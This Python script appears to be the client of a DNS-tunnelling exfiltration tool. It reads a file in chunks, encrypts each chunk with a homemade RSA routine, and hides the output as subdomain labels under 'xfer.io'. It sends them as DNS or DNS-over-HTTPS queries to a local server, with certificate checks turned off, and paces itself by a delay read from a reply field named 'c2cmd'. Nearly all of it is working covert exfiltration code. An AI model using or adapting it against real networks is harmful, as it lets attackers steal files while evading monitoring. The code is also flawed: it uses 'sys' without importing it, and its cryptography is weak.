from dnslib.server import *
from dnslib.intercept import *
import requests, os
from copy import deepcopy
from time import sleep

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib, random

domain = 'xfer'
tld = 'io'

    #aes = AESGCM(key)    
    #nonce = os.urandom(12)


e = (2**80) + 1
n = 172832441894998260376220012196504623107426809480060512025867051243862591841142762389754856720075168799498705818668742751
block_size = len(str(n))//4
if (block_size * 4 <= len(str(n))):
    block_size += 1


def pkcs7_pad(data, block_size):
  padding_size = (block_size - len(data)) % block_size
  if padding_size == 0:
    padding_size = block_size
    
  padding = (chr(padding_size) * padding_size).encode()
  return data + padding


def rsa_ende_crypt(inp, key):
    e, n = key
    def fast(base):
        prev = base
        for bit in bin(e)[3:]:
            if bit == '1':
                prev = ((prev**2)*base) % n
            else:
                prev = (prev**2) % n
        return prev
    return fast(inp)


def bytes_to_num(b):
  byte_txt = deepcopy(b)
  txt_size = len(byte_txt)
  if len(byte_txt) >= block_size:
    blocks = [byte_txt[i:i+block_size] for i in range(0, txt_size+1, block_size)]
    blocks[-1] = pkcs7_pad(blocks[-1], block_size-1)
    return [sum([txt[i] * 1000**(block_size - (i+1)) for i in range(0, len(txt))]) for txt in blocks]
  else:
    padded_txt = pkcs7_pad(byte_txt, block_size-1)
    return [sum([padded_txt[i] * 1000**(block_size - (i+1)) for i in range(block_size-1)])]

  
def process(seq, buf):
  num = bytes_to_num(buf)[0]
  res = rsa_ende_crypt(num, (e, n))
  res_hex = hex(res)[2:]
  if len(res_hex) == 1:
    a, b = '0'*50, '0'*50
  else:
    i = len(res_hex) // 2
    a, b = res_hex[:i], res_hex[i:]
  return f'{hex(seq)[2:]}.{a}.{b}.{domain}.{tld}'
  

def send(file, time_delay):
  with open(file, 'rb') as f:
    hash = hashlib.sha256()

    seq = 0
    while True:
      buf = f.read(32)
      hash.update(buf)
      if not buf:
        break
      q = DNSRecord.question(process(seq, buf))
      a = q.send("localhost", 8053, tcp=False)
      c2cmd = str(DNSRecord.parse(a).rr[0].rdata).split('.')
      sleep(int(c2cmd[3]))
      seq += 1
    
    hash_hex = hash.hexdigest()
    i = random.randint(3,60)
    q = DNSRecord.question(f'{hash_hex[:i]}.{hash_hex[i:]}.xfer.io')
    q.send("localhost", 8053, tcp=False)


def send_https(file, delay):
  with open(file, 'rb') as f:
    hash = hashlib.sha256()

    seq = 0
    while True:
      buf = f.read(16)
      hash.update(buf)
      if not buf:
        break
      
      url = process(seq,buf)
      r = requests.get(f'https://localhost:5000/dns-query?name={url}',verify=False)
      sleep(delay)
      if r.status_code != 200:
        print(seq, buf)
        print(f'{r.status_code} --- {url}')
      seq += 1
    
    hash_hex = hash.hexdigest()
    i = random.randint(3,60)
    url = f'{hash_hex[:i]}.{hash_hex[i:]}.xfer.io'
    
    r = requests.get(f'https://localhost:5000/dns-query?name={url}', verify=False)
    print(r.status_code)



if __name__ == "__main__":
  if len(sys.argv) > 1 and os.path.exists(sys.argv[1]):
    send_https(sys.argv[1], 0)
